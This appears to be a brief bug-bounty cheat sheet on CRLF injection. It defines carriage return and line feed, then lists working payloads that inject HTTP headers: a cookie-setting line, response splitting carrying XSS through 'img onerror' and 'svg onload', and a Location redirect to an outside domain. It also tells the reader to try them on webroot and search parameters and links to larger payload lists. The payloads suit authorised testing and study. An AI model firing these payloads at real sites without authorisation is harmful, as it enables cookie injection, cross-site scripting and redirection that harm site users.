### CR and LF are **control characters or bytecode that can be used to mark a line break in a text file**. CR = Carriage Return ( \r , 0x0D in hexadecimal, 13 in decimal) — moves the cursor to the beginning of the line without advancing to the next line.

You can use %0d (carriage return, aka take cursor to start) and then %0a (newline) to trick the application into thinking the input starts here. 

```
/%0d%0aSet-cookie:%20CRLF=%20CRLF
/%0aSet-cookie: CRLF%0a%0a<img src=x onerror=alert(9)>
/%0d%0aLocation:%20http://www.evilzone.org
/%0d%0a%0d%0a 

%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e
```

<https://youtu.be/0R3w3JSGCIw?list=PLtiuVR3b_k4DlnU97uvXDyErEdFd4diDx&t=33>

Use these payloads on webroot and paramaters like search: 
<https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md>
<https://github.com/cujanovic/CRLF-Injection-Payloads/blob/master/CRLF-payloads.txt>
<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CRLF%20Injection/crlfinjection.txt>